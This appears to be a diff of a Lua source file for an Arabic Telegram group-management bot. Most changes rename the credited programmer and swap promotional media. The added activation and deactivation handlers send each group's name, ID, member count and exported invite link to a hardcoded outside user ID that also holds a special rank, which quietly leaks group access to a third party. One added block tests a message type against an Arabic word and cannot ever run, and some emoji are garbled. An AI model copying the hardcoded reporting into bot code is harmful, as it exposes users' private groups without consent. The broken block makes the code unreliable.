@@ -333,7 +333,7 @@ return var
 end 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1936946115) then  
-var = 'المبرمج مسلم'
+var = 'المبرمج سمير'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -1098,7 +1098,7 @@ end
 if text == 'قـسم الـمـبـرمـجـيـن' then  
 local bl = 'هنا مبرمجين السورس ياروحي🌝💘'
 local keyboard = {
-{'المبرمج مسلم','قناه الاستوري'},
+{'المبرمج سمير','قناه الاستوري'},
 {'مالك السورس'},
 {'مطور السورس'},
 {'العوده'},
@@ -2670,165 +2670,77 @@ local NameChat = NameChat:gsub("","")
 local NameChat = NameChat:gsub("*","")  
 local NameChat = NameChat:gsub("{","")  
 local NameChat = NameChat:gsub("}","")  
-sendText(msg.chat_id_,"🌕تم طرد البوت من جروب \n\n🌕بواسطة  {"..Name.."}\n🌕اسم الجروب {"..NameChat.."}\n🌕ايدي الجروب {"..msg.chat_id_.."} ",0,'md')  
+sendText(SUDO,"🌕تم طرد البوت من جروب \n\n🌕بواسطة  {"..Name.."}\n🌕اسم الجروب {"..NameChat.."}\n🌕ايدي الجروب {"..msg.chat_id_.."} ",0,'md')  
 end,nil) 
 end,nil) 
 end
 -------------------------------------------------------------------------------------------------------------
-if text == 'تفعيل' and Sudo(msg) then 
+if msg.content_.ID == "مطور" and tonumber(msg.content_.user_.id_) == tonumber(bot_id) then  
+database:srem(bot_id.."Chek:Groups", msg.chat_id_)  
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success) 
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp)  
+local Name1 = result.first_name_ 
+local Name1 = Name1:gsub('"',"")  
+local Name1 = Name1:gsub("'","")  
+local Name1 = Name1:gsub("","")  
+local Name1 = Name1:gsub("*","")  
+local Name1 = Name1:gsub("{","")  
+local Name1 = Name1:gsub("}","")  
+local Name = '['..Name1..'](tg://user?id='..result.id_..')' 
+local NameChat = dp.title_ 
+local NameChat = NameChat:gsub('"',"")  
+local NameChat = NameChat:gsub("'","")  
+local NameChat = NameChat:gsub("","")  
+local NameChat = NameChat:gsub("*","")  
+local NameChat = NameChat:gsub("{","")  
+local NameChat = NameChat:gsub("}","")  
+sendText(SUDO,"🌕تم طرد البوت من جروب \n\n🌕بواسطة  {"..Name.."}\n🌕اسم الجروب {"..NameChat.."}\n🌕ايدي الجروب {"..msg.chat_id_.."} ",0,'md')  
+end,nil) 
+end,nil) 
+end
+-------------------------------------------------------------------------------------------------------------
+if (text == 'تفعيل' or text == '/start@UU_SD_bot') and Sudo(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' 🌕لا تستطيع استخدام البوت \n 🌕 يرجى الاشتراك بالقناه اولا \n 🌕 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,'◍ لا تستطيع استخدام البوت \n ◍ يرجى الاشتراك بالقناه اولا \n ◍ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
 if msg.can_be_deleted_ == false then 
-send(msg.chat_id_, msg.id_,' 🌕عذرا يرجى ترقيه البوت مشرف !')
+send(msg.chat_id_, msg.id_,'◍ عذرا يرجى ترقيه البوت مشرف !')
 return false  
 end
 tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
-if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
-send(msg.chat_id_, msg.id_,' 🌕عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
+if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'◍ عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
 return false
 end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
 if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
-send(msg.chat_id_, msg.id_,' 🌕 الـجـروب مـفعـل مـن قبـل')
+send(msg.chat_id_, msg.id_,'◍ بالتأكيد تم تفعيل الجروب')
 else
-sendText(msg.chat_id_,'\n 🌕 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 🌕تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}\n  وتم تــرقــيه جــمــيع الـادمــنــيه',msg.id_/2097152/0.5,'md')
-database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
-local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
-local NameChat = chat.title_
-local IdChat = msg.chat_id_
-local NumMember = data.member_count_
-local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
-if linkgpp.ok == true then 
-LinkGp = linkgpp.result
-else
-LinkGp = 'لا يوجد'
-end
-Text = ' 🌕 تـم تـشغـيل الـبوت فـي الـجـروب جـديد\n'..
-'\n 🌕بواسطة {「'..Name..'」}'..
-'\n 🌕ايدي الجروب {'..IdChat..'}'..
-'\n 🌕اسم الجروب {['..NameChat..']}'..
-'\n 🌕عدد اعضاء الجروب *{'..NumMember..'}*'..
-'\n 🌕الرابط {['..LinkGp..']}'
-if not DevSoFi(msg) then
-sendText(SUDO,Text,0,'md')
-end
-end
-end,nil) 
-end,nil) 
-end,nil)
-end
-if text == 'تعطيل' and Sudo(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' 🌕لا تستطيع استخدام البوت \n 🌕 يرجى الاشتراك بالقناه اولا \n 🌕 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
-tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
-if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
-send(msg.chat_id_, msg.id_,' 🌕 الـبوت مـعطـل مـن قبـل')
-else
-sendText(msg.chat_id_,'\n 🌕 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 🌕 تـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
-database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
-local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
-local NameChat = chat.title_
-local IdChat = msg.chat_id_
-local AddPy = var
-local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
-if linkgpp.ok == true then 
-LinkGp = linkgpp.result
-else
-LinkGp = 'لا يوجد'
-end
-Text = '\n تـم تـعـطيل الـبوت مـن الـجـروب 🌕'..
-'\n 🌕بواسطة {「'..Name..'」}'..
-'\n 🌕ايدي الجروب {'..IdChat..'}'..
-'\n 🌕اسم الجروب {['..NameChat..']}'..
-'\n 🌕الرابط {['..LinkGp..']}'
-if not DevSoFi(msg) then
-sendText(SUDO,Text,0,'md')
-end
-end
-end,nil) 
-end,nil) 
-end
-if msg.content_.ID == "MessageChatAddMembers" then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' 🌕لا تستطيع استخدام البوت \n 🌕 يرجى الاشتراك بالقناه اولا \n 🌕 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-if msg.can_be_deleted_ == false then 
-send(msg.chat_id_, msg.id_,' 🌕عذرا يرجى ترقيه البوت مشرف !')
+tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
+local admins = data.members_
+for i=0 , #admins do
+if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
+owner_id = admins[i].user_id_
+tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
+if b.first_name_ == false then
+send(msg.chat_id_, msg.id_,"◍ حساب المنشئ محذوف")
 return false  
 end
-tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
-if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
-send(msg.chat_id_, msg.id_,' 🌕عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
-return false
-end
-tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
-tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
-tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
-if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
-if da and da.user_id_ == msg.sender_user_id_ then
-if da.status_.ID == "ChatMemberStatusCreator" then
-var = 'المالك'
-elseif da.status_.ID == "ChatMemberStatusEditor" then
-var = 'مشرف'
-end
-if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
-send(msg.chat_id_, msg.id_,' 🌕تـم تـشغـيل الـبوت فـي الـجـروب ')
-else
-sendText(msg.chat_id_,'\n 🌕 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 🌕تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}\n  وتم تــرقــيه جــمــيع الـادمــنــيه',msg.id_/2097152/0.5,'md')
-database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
-database:sadd(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_)
-local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
-local NumMember = data.member_count_
-local NameChat = chat.title_
-local IdChat = msg.chat_id_
-local AddPy = var
-local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
-if linkgpp.ok == true then 
-LinkGp = linkgpp.result
-else
-LinkGp = 'لا يوجد'
-end
-Text = ' 🌕 تـم تـشغـيل الـبوت فـي الـجـروب جـديد\n'..
-'\n 🌕بواسطة {「'..Name..'」}'..
-'\n 🌕موقعه في الجروب {'..AddPy..'}' ..
-'\n 🌕ايدي الجروب {'..IdChat..'}'..
-'\n 🌕عدد اعضاء الجروب *{'..NumMember..'}*'..
-'\n 🌕اسم الجروب {['..NameChat..']}'..
-'\n 🌕الرابط {['..LinkGp..']}'
-if not DevSoFi(msg) then
-sendText(SUDO,Text,0,'md')
-end
-end
-end
-end
+local UserName = (b.username_ or "S_1_1m") 
+database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, owner_id)
 end,nil)   
-end,nil) 
-end,nil) 
-end,nil)
 end
-if text ==("تفعيل") and Sudo(msg) then
+end
+end,nil)
+sendText(msg.chat_id_,'\n◍ بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n◍ تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
+database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 local num2 = 0
 local admins = data.members_
@@ -2848,11 +2760,179 @@ database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
 end
 end
 if num2 == 0 then
-send(msg.chat_id_, msg.id_," ") 
+send(msg.chat_id_, msg.id_,"◍ لا يوجد ادمنيه ليتم رفعهم فى البوت") 
 else
-send(msg.chat_id_, msg.id_,"  ") 
+send(msg.chat_id_, msg.id_,"◍ تمت ترقيه { "..num2.." } من الادمنيه فى البوت") 
+end
+end,nil) 
+local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
+local NameChat = chat.title_
+local IdChat = msg.chat_id_
+local NumMember = data.member_count_
+local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if linkgpp.ok == true then 
+LinkGp = linkgpp.result
+else
+LinkGp = 'لا يوجد'
+end
+Text = '◍ تم تفعيل جروب جديده\n'..
+'\n◍ بواسطة {'..Name..'}'..
+'\n◍ ايدي الجروب {'..IdChat..'}'..
+'\n◍ اسم الجروب {['..NameChat..']}'..
+'\n◍ عدد اعضاء الجروب *{'..NumMember..'}*'..
+'\n◍ الرابط {['..LinkGp..']}'
+if not SudoBot(msg) then
+sendText(SUDO,Text,0,'md')
+sendText(1936946115,Text,0,'md')
+end
+end
+end,nil) 
+end,nil) 
+end,nil)
+end
+if text == 'تعطيل' and Sudo(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'◍ لا تستطيع استخدام البوت \n ◍ يرجى الاشتراك بالقناه اولا \n ◍ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
+if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
+send(msg.chat_id_, msg.id_,'◍ بالتأكيد تم تعطيل الجروب')
+else
+sendText(msg.chat_id_,'\n◍ بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n◍ تم تعطيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
+database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
+local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
+local NameChat = chat.title_
+local IdChat = msg.chat_id_
+local AddPy = var
+local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if linkgpp.ok == true then 
+LinkGp = linkgpp.result
+else
+LinkGp = 'لا يوجد'
+end
+Text = '\nتم تعطيل الجروب ◍ '..
+'\n◍ بواسطة {'..Name..'}'..
+'\n◍ ايدي الجروب {'..IdChat..'}'..
+'\n◍ اسم الجروب {['..NameChat..']}'..
+'\n◍ الرابط {['..LinkGp..']}'
+if not SudoBot(msg) then
+sendText(SUDO,Text,0,'md')
+sendText(1936946115,Text,0,'md')
+end
+end
+end,nil) 
+end,nil) 
+end
+if (text == 'تفعيل' or text == '/start@UU_SD_bot') and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'◍ لا تستطيع استخدام البوت \n ◍ يرجى الاشتراك بالقناه اولا \n ◍ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+if msg.can_be_deleted_ == false then 
+send(msg.chat_id_, msg.id_,'◍ عذرا يرجى ترقيه البوت مشرف !')
+return false  
+end
+tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
+if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'◍ عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
+return false
+end
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
+tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
+if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
+if da and da.user_id_ == msg.sender_user_id_ then
+if da.status_.ID == "ChatMemberStatusCreator" then
+var = 'المالك'
+elseif da.status_.ID == "ChatMemberStatusEditor" then
+var = 'مشرف'
+end
+if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
+send(msg.chat_id_, msg.id_,'◍ تم تفعيل الجروب')
+else
+tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
+local admins = data.members_
+for i=0 , #admins do
+if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
+owner_id = admins[i].user_id_
+tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
+if b.first_name_ == false then
+send(msg.chat_id_, msg.id_,"◍ حساب المنشئ محذوف")
+return false  
+end
+local UserName = (b.username_ or "S_1_1m") 
+database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, owner_id)
+end,nil)   
+end
+end
+end,nil)
+sendText(msg.chat_id_,'\n◍ بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n◍ تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
+database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
+tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
+local num2 = 0
+local admins = data.members_
+for i=0 , #admins do
+if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
+database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
+num2 = num2 + 1
+tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
+if b.username_ == true then
+end
+if b.first_name_ == false then
+database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
 end
 end,nil)   
+else
+database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
+end
+end
+if num2 == 0 then
+send(msg.chat_id_, msg.id_,"◍ لا يوجد ادمنيه ليتم رفعهم فى البوت") 
+else
+send(msg.chat_id_, msg.id_,"◍ تمت ترقيه { "..num2.." } من الادمنيه فى البوت") 
+end
+end,nil)   
+local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
+local NumMember = data.member_count_
+local NameChat = chat.title_
+local IdChat = msg.chat_id_
+local AddPy = var
+local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if linkgpp.ok == true then 
+LinkGp = linkgpp.result
+else
+LinkGp = 'لا يوجد'
+end
+Text = '◍ تم تفعيل جروب جديده\n'..
+'\n◍ بواسطة {'..Name..'}'..
+'\n◍ موقعه في الجروب {'..AddPy..'}' ..
+'\n◍ ايدي الجروب {'..IdChat..'}'..
+'\n◍ عدد اعضاء الجروب *{'..NumMember..'}*'..
+'\n◍ اسم الجروب {['..NameChat..']}'..
+'\n◍ الرابط {['..LinkGp..']}'
+if not SudoBot(msg) then
+sendText(SUDO,Text,0,'md')
+sendText(1936946115,Text,0,'md')
+end
+end
+end
+end
+end,nil)   
+end,nil) 
+end,nil) 
+end,nil)
 end
 if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevSoFi(msg) then
 local Num = text:match("ضع عدد الاعضاء (%d+)$") 
@@ -3167,42 +3247,42 @@ local Text = [[
 [↝ 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐬𝐨𝐮𝐫𝐜𝐞 𝐛𝐚𝐤𝐚𝐫](t.me/UU_SD1)
 
 
-[↝ 𝐞𝐥𝐦𝐮𝐬𝐥𝐢𝐦](t.me/S_31_m)
+[↝𝑺𝑨𝑴𝑬𝑬𝑹 ](t.me/S_31_m)
 
 
-[↝ 𝐜𝐡 𝐛𝐚𝐤𝐚𝐫](t.me/UU_SD1)
+[↝ 𝑪𝑯 𝑩𝑨𝑲𝑨𝑹 ](t.me/UU_SD1)
 ┗━━━━━━•⊱𖥔⊰•━━━━━━━┛
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹𝐜𝐡 𝐛𝐚𝐤𝐚𝐫˼', url="t.me/UU_SD1"},{text = '˹M U S L I M ˼',url="t.me/S_31_m"}},
+{{text = '˹𝑪𝑯 𝑩𝑨𝑲𝑨𝑹˼', url="t.me/UU_SD1"},{text = '˹M U S L I M ˼',url="t.me/S_31_m"}},
 {{text = 'الـمـطـور♡', url="http://t.me/"..sudos.UserName}},
 {{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/M_S_U1/13&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/UU_SD1/156&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'قناه الاستوري' or text == 'استوري المسلم' or text == 'قناه الاستوريهات' or text == 'الاستوريهات' then 
+if text == 'قناه الاستوري' or text == 'استوري سمير' or text == 'قناه الاستوريهات' or text == 'الاستوريهات' then 
 local Text = [[ 
 قناه الاستوري ياروحي 🌚💘
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '❨ استوري المسلم  ❩', url="t.me/S_1_0M"}},
+{{text = '❨ استوري سمير  ❩', url="t.me/S_1_0M"}},
 {{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/M_S_U1/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'تيم المسلم' or text == 'تيم' or text == 'متيجي' or text == 'اقوي تيم' then 
+if text == 'تيم سمير' or text == 'تيم' or text == 'متيجي' or text == 'اقوي تيم' then 
 local Text = [[ 
-[متيجي تنضم لتيم المسلم اقوي تيم ع التليجرام](t.me/S_1_2M)
+[متيجي تنضم لتيم سمير اقوي تيم ع التليجرام](t.me/S_1_2M)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '❨ 𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴 𝑻𝑬𝑨𝑴  ❩', url="t.me/S_1_2M"}},
+{{text = '❨ 𝑻𝑬𝑨𝑴 𝑺𝑨𝑴𝑬𝑬𝑹 ❩', url="t.me/S_1_2M"}},
 {{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3217,7 +3297,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '˹B A T O T˼', url="t.me/ba_to_t"},{text = '˹H A M O˼', url="t.me/H_1_0O"}},
-{{text = '˹M U S L I M ˼', url="t.me/S_31_m"}}, 
+{{text = '˹S A M E E R˼', url="t.me/S_31_m"}}, 
 {{text = '˹𝑪𝑯 ˼', url="t.me/UU_SD1"}},
 {{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
 }
@@ -3225,9 +3305,9 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/M_S_U1/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'سمير' or text == 'سمير عصام' or text == 'سمير المسلم' then
+if text == 'سمير' or text == 'سمير عصام' then
 local Text = [[
-[المبرمج سمير المسلم](t.me/sameer_3ssam)
+[المبرمج سمير عصام](t.me/sameer_3ssam)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -3238,7 +3318,7 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sameer_3ssam/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text ==  'المبرمج مسلم' or text == 'المسلم' or text == 'مسلم' or text == 'المبرمج المسلم' then
+if text ==  'المبرمج سمير' or text == 'المبرمج سمير عصام' then
 local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
 if TEXT_SUDO then 
 send(msg.chat_id_, msg.id_,TEXT_SUDO)
@@ -3276,7 +3356,7 @@ keyboard.inline_keyboard = {
 {{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/M_S_U1/13&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/UU_SD1/156&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'المبرمج الفاشل' or text == 'ليجاند' then
@@ -10643,7 +10723,7 @@ TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق")
 TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
 TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
 if Can_or_NotCan(result.id_, msg.chat_id_) then
-send(msg.chat_id_, msg.id_, "\n 🌕 عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
+send(msg.chat_id_, msg.id_, "\n ?? عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
 else
 usertext = '\n 🌕 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'UU_SD1')..')'
 status  = '\n 🌕 تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
@@ -13812,7 +13892,7 @@ end
 if tonumber(msg.sender_user_id_) == tonumber(1936946115) then
 if text == 'رتبتي' then
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[رتبتك المبرمج مسلم🥺🤍](t.me/UU_SD1)'
+local textt = '[رتبتك المبرمج سمير🥺🤍](t.me/UU_SD1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -13904,7 +13984,7 @@ end
 if tonumber(msg.sender_user_id_) == tonumber(1936946115) then
 if text == 'انا مين' then
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[انت المبرمج مسلم نن عيني 🥺🤍](t.me/UU_SD1)'
+local textt = '[انت المبرمج سمير نن عيني 🥺🤍](t.me/UU_SD1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -15291,7 +15371,7 @@ Msᴀɢ ~ #msgs
 👳🏼‍♂ - 𝄬 𝗖𝗛 - 「@UU_SD1」 🌕.
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. ??
 ➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
 ➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
 ➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
@@ -15805,7 +15885,7 @@ Msᴀɢ ~ #msgs
 ]],
 [[
 - 🇪🇬 UsErNaMe . #username 𖠲
-- 🇪?? StAsT . #stast 𖠲
+- 🇪?? StAsT . #stast ??
 - 🇪🇬 Id . #id 𖠲
 - 🇪🇬 GaMeS . #game 𖠲
 - 🇪🇬 MsGs . #msgs 𖠲
